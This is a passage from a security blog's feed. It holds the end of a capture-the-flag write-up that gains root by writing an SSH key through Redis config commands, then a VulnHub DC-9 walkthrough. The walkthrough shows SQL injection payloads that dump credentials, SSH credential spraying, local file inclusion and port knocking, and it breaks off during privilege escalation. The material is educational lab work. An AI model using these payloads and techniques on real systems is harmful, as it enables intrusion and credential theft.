</span></span><span class="line"><span class="cl">SHA256:AVk3h1vdyP/x1KCcBr/IQY7eac9vzZUUrMx/pNkB0KI user@redlike-20edff3e85f553f2-55b895664b-szch7
</span></span><span class="line"><span class="cl">The key<span class="err">&#39;</span>s randomart image is:
</span></span><span class="line"><span class="cl">+---<span class="o">[</span>RSA 3072<span class="o">]</span>----+
</span></span><span class="line"><span class="cl"><span class="p">|</span>      .o. oo+o.o <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>      .. .++.o<span class="o">=</span>o.<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>        .+.*+oooo<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>        .E+ *+ +<span class="o">=</span><span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>       .So <span class="o">=</span> .o**<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>        . * . oo*<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>         . o   oo<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>            o . o<span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>             o.  <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</span></span></code></pre></div><p>Then I will have to wrap the SSH public key with two extra newlines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ <span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; spaced_key.txt
</span></span></code></pre></div><p>Now the key can be stored in Redis using the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ cat spaced_key.txt <span class="p">|</span> redis-cli -x <span class="nb">set</span> spaced_key.txt
</span></span><span class="line"><span class="cl">OK
</span></span></code></pre></div><p>Then I can just set the database file name to  <code>authorized_keys</code> and save that under <code>/root/.ssh/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ redis-cli
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /root/.ssh
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; save
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt;
</span></span></code></pre></div><p>And it worked, I can SSH login as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh root@redlike-20edff3e85f553f2-55b895664b-szch7
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;redlike-20edff3e85f553f2-55b895664b-szch7 (10.112.8.36)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:m9vzgGyWcCXB1tg0uLHYCKCaDNZFUnbeSirAvvLkYxU.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>redlike-20edff3e85f553f2-55b895664b-szch7,10.112.8.36<span class="s1">&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class="line"><span class="cl"><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Documentation:  https://help.ubuntu.com
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Management:     https://landscape.canonical.com
</span></span></span><span class="line"><span class="cl"><span class="s1"> * Support:        https://ubuntu.com/advantage
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">This system has been minimized by removing packages and content that are
</span></span></span><span class="line"><span class="cl"><span class="s1">not required on a system that users do not log into.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Ubuntu system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span class="line"><span class="cl">applicable law.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@redlike-20edff3e85f553f2-55b895664b-szch7:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@redlike-20edff3e85f553f2-55b895664b-szch7:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">--w------- <span class="m">1</span> root root <span class="m">39</span> Sep <span class="m">16</span> 14:43 flag.txt
</span></span><span class="line"><span class="cl">root@redlike-20edff3e85f553f2-55b895664b-szch7:~# cat flag.txt
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>69dc14707af23b728ebd1363715ec890<span class="o">}</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>VulnHub - DC-9</title>
      <link>https://fahmifj.github.io/vulnhub/dc9/</link>
      <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/vulnhub/dc9/</guid>
      <description>DC-9 from VulnHub features a website that is vulnerable to SQL injection.
I’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.
Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.</description>
      <content:encoded><![CDATA[<p>DC-9 from VulnHub features a website that is vulnerable to SQL injection.</p>
<p>I’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.</p>
<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. Even though I gained a foothold by skipping the LFI and port knocking, I&rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Blind SQL injection</li>
<li>Local file Inclusion</li>
<li>Port knocking</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Arpscan</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="host-discovery---arp-scan">Host Discovery - arp-scan</h3>
<p><code>192.168.2.102</code> is the target.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ arp-scan --interface eth0 192.168.2.0/24 <span class="p">|</span> tee scans/00-arp-scan
</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
</span></span><span class="line"><span class="cl">Starting arp-scan 1.9.7 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.2.2     0a:00:27:00:00:0a       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.2.1     08:00:27:d9:63:87       PCS Systemtechnik GmbH
</span></span><span class="line"><span class="cl">192.168.2.102   08:00:27:54:bc:fd       PCS Systemtechnik GmbH
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">3</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span></span><span class="line"><span class="cl">Ending arp-scan 1.9.7: <span class="m">256</span> hosts scanned in 1.986 seconds <span class="o">(</span>128.90 hosts/sec<span class="o">)</span>. <span class="m">3</span> responded
</span></span></code></pre></div><h3 id="port-scan---nmap">Port Scan - nmap</h3>
<p><code>nmap</code> shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ nmap -n -sC -sV -oA scans/10-initial-dc9 <span class="s1">&#39;192.168.2.102&#39;</span> -v
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Thu Apr  8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.2.102
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00048s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE    SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp filtered ssh
</span></span><span class="line"><span class="cl">80/tcp open     http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Example.com - Staff Details - Welcome
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:54:BC:FD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span></code></pre></div><p>But, later it turns into open state after a full port scan performed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ nmap -n -p22 192.168.2.102
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-08 05:21 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.2.102
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00075s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:54:BC:FD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span></code></pre></div><p>I can confirms it with <code>netcat</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ nc 192.168.2.102 <span class="m">22</span>
</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The home page of this site doesn&rsquo;t provide anything useful.</p>
<p><div class="img-container"><img src="imgs/image-20210408134805695.png" alt="image-20210408134805695"  /></div>
</p>
<p>The Display All Records menu functions to display all user records.</p>
<p><div class="img-container"><img src="imgs/image-20210408134819215.png" alt="image-20210408134819215"  /></div>
</p>
<p>There is a user input on the Search menu</p>
<p><div class="img-container"><img src="imgs/image-20210408134833069.png" alt="image-20210408134833069"  /></div>
</p>
<p>The Manage menu has login function.</p>
<p><div class="img-container"><img src="imgs/image-20210408134853665.png" alt="image-20210408134853665"  /></div>
</p>
<p>From here I can assume that the website uses database.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="sql-injection">SQL injection</h3>
<h4 id="identify">Identify</h4>
<p>There&rsquo;s error-based SQL injection on <code>search.php</code>, and the initial detection is simple, <em>when I try put <code>'</code> it gives bug</em> (joke <a href="https://twitter.com/LiveOverflow/status/1313157161007054854">reference</a>).</p>
<p>In this web, the SQLi vulnerability can be identified by adding a single quote  (&rsquo;`) at the end of users&rsquo; first name that I want to search.</p>
<p><div class="img-container"><img src="imgs/image-20210602031408130.png" alt="image-20210602031408130"  /></div>
</p>
<p>Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without <code>'</code>, the search should return one related result.</p>
<p><div class="img-container"><img src="imgs/image-20210602031344011.png" alt="image-20210602031344011"  /></div>
</p>
<p>But then, when I submit <code>' OR 1=1 -- -'</code>, it returns all the records.</p>
<p><div class="img-container"><img src="imgs/image-20210602030509083.png" alt="image-20210602030509083"  /></div>
</p>
<h4 id="union-injection">UNION injection</h4>
<p>To perform the SQL union injection attack manually, I&rsquo;ll have to identify the available columns and its data type.</p>
<p>There are 6 columns with the data type of each column is string. The injection query is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,&#39;</span><span class="n">b</span><span class="s1">&#39;,&#39;</span><span class="k">c</span><span class="s1">&#39;,&#39;</span><span class="n">d</span><span class="s1">&#39;,&#39;</span><span class="n">e</span><span class="s1">&#39;,&#39;</span><span class="n">f</span><span class="s1">&#39; -- 
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033329668.png" alt="image-20210602033329668"  /></div>
</p>
<p>I’ll pull out database version, current database, and the available databases.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT @@version, &#39;</span><span class="k">Current</span><span class="w"> </span><span class="n">DB</span><span class="p">:</span><span class="s1">&#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033848222.png" alt="image-20210602033848222"  /></div>
</p>
<p>The website uses MariaDB as its database. The database currently in use is <code>Staff</code>. <code>Staff</code> and <code>users</code> are non-default database, so I&rsquo;ll look into these tables.</p>
<p>With the following query, I can get the two tables name from database <code>Staff</code>: <code>StaffDetails</code> and <code>Users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class="n">Staff</span><span class="s1">&#39; -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602034617576.png" alt="image-20210602034617576"  /></div>
</p>
<p><code>StaffDetails</code> contains the all the staff records which previously seen at the Display All Records menu.</p>
<p>I’ll get the columns name of the table <code>Users</code> with the following query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class="n">Users</span><span class="s1">&#39; -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602035249528.png" alt="image-20210602035249528"  /></div>
</p>
<p>I will get the contents of the Username and the Password columns, and it returns a set of credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT group_concat(username, &#39;</span><span class="p">:</span><span class="s1">&#39;, password),2,3,4,5,6 FROM Users -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602040550090.png" alt="image-20210602040550090"  /></div>
</p>
<p>The password is in md5 format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> 856f5de590ef37314e7c3bdf6f8a66dc <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">33</span>
</span></span></code></pre></div><p>The hash can be cracked online. The credentials is <code>admin:transorbital1</code>, and I’ll just keep that for now.</p>
<p><div class="img-container"><img src="imgs/image-20210602044447046.png" alt="image-20210602044447046"  /></div>
</p>
<p>On database <code>users</code>,  there is only one table called <code>UserDetails</code>. Here is the query.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class="n">users</span><span class="s1">&#39; -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041638341.png" alt="image-20210602041638341"  /></div>
</p>
<p>With the following query, I can get the columns on table <code>UserDetails</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class="n">UserDetails</span><span class="s1">&#39; -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041745247.png" alt="image-20210602041745247"  /></div>
</p>
<p><code>UserDetails</code> has 6 columns, but I&rsquo;m interested only with the <code>username</code> and the <code>password</code> column, and I&rsquo;ll pull out the their contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT group_concat(username,&#34;:&#34;,password),2,3,4,5,6 FROM users.UserDetails -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041822329.png" alt="image-20210602041822329"  /></div>
</p>
<p>That&rsquo;s a lot of credentials. I can sort these creds with <code>sed</code> command by substituting comma with new line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> -n <span class="s1">&#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0&#39;</span> <span class="p">|</span> sed -s <span class="s1">&#39;s/,/\n/g&#39;</span>
</span></span><span class="line"><span class="cl">marym:3kfs86sfd
</span></span><span class="line"><span class="cl">julied:468sfdfsd2
</span></span><span class="line"><span class="cl">fredf:4sfd87sfd1
</span></span><span class="line"><span class="cl">barneyr:RocksOff
</span></span><span class="line"><span class="cl">tomc:TC<span class="p">&amp;</span>TheBoyz
</span></span><span class="line"><span class="cl">jerrym:B8m#48sd
</span></span><span class="line"><span class="cl">wilmaf:Pebbles
</span></span><span class="line"><span class="cl">bettyr:BamBam01
</span></span><span class="line"><span class="cl">chandlerb:UrAG0D!
</span></span><span class="line"><span class="cl">joeyt:Passw0rd
</span></span><span class="line"><span class="cl">rachelg:yN72#dsd
</span></span><span class="line"><span class="cl">rossg:ILoveRachel
</span></span><span class="line"><span class="cl">monicag:3248dsds7s
</span></span><span class="line"><span class="cl">phoebeb:smellycats
</span></span><span class="line"><span class="cl">scoots:YR3BVxxxw87
</span></span><span class="line"><span class="cl">janitor:Ilovepeepee
</span></span><span class="line"><span class="cl">janitor2:Hawaii-Five-0
</span></span></code></pre></div><h3 id="shell-access">Shell access</h3>
<h4 id="ssh-login-brute-force">SSH Login brute-force</h4>
<p>Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using <code>crackmapexec</code>. It returned 3 valid logins.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> chandlerb:UrAG0D! 
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> joeyt:Passw0rd 
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> janitor:Ilovepeepee 
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="intended-lfi-and-port-knocking">(Intended) LFI and Port Knocking</h4>
<p>In my case, I discovered that the website is vulnerable to LFI after inspecting the source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">chandlerb@dc-9:/var/www/html$ cat manage.php
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;contact-info.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$show_errors</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;display_errors&#39;</span><span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="nv">$show_errors</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span>file_exists<span class="o">(</span><span class="nv">$file</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            include<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> <span class="s2">&#34;File does not exist&#34;</span> . <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># LFI vulnerability starts from here</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">            <span class="c1"># No input sanitization poc: manage?file=../../../../etc/passwd</span>
</span></span><span class="line"><span class="cl">            include<span class="o">(</span><span class="s1">&#39;directory/&#39;</span> . <span class="nv">$file</span><span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Using LFI is the intended way to gain a foothold before performing brute force. In order to exploit it, I previously had to login using the credentials I obtained through SQLi (<code>admin:transorbital1</code>).</p>
<p>With LFI can include  <code>/etc/knockd.conf</code> to read the knocking sequence to open the SSH port.</p>
<p><div class="img-container"><img src="imgs/image-20210602050027114.png" alt="image-20210602050027114"  /></div>
</p>
<p>In case the SSH port is closed, then to open it, I&rsquo;ll need to interact with port 7469,8475,9842 sequentially.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="m">7469</span> <span class="m">8475</span> 9842<span class="p">;</span> <span class="k">do</span> nc -w1 192.168.2.102 <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602051747909.png" alt="image-20210602051747909"  /></div>
</p>
<p>To close the port, I&rsquo;ll need to knock in reverse order:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="m">9842</span> <span class="m">8475</span> 7469<span class="p">;</span> <span class="k">do</span> nc -w1 192.168.2.102 <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602052201358.png" alt="image-20210602052201358"  /></div>
</p>
<p>Then, from here, I should use SSH brute force (which I did earlier).</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-fredf">Shell as fredf</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Only user janitor that has one valuable thing in its home dir, and that is a password list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
</span></span><span class="line"><span class="cl">BamBam01
</span></span><span class="line"><span class="cl">Passw0rd
</span></span><span class="line"><span class="cl">smellycats
</span></span><span class="line"><span class="cl">P0Lic#10-4
</span></span><span class="line"><span class="cl">B4-Tru3-001
</span></span><span class="line"><span class="cl">4uGU5T-NiGHts
</span></span></code></pre></div><p>With those new password, I&rsquo;ll perform another brute force using <code>crackmapexec</code>.</p>
<h4 id="ssh---fredf">SSH - fredf</h4>
<p><code>crackmapexec</code> returns one valid login for <code>fred:B4-Tru3-001</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> fredf:B4-Tru3-001 
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ ssh fredf@192.168.2.102
</span></span><span class="line"><span class="cl">fredf@192.168.2.102<span class="err">&#39;</span>s password:
</span></span><span class="line"><span class="cl">Linux dc-9 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class="line"><span class="cl">permitted by applicable law.
</span></span><span class="line"><span class="cl">Last login: Thu Apr  <span class="m">8</span> 20:10:42 <span class="m">2021</span> from 192.168.2.103
</span></span><span class="line"><span class="cl">fredf@dc-9:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User fredf has sudo privileges on a custom binary called <code>test</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/home$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> fredf on dc-9:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User fredf may run the following commands on dc-9:
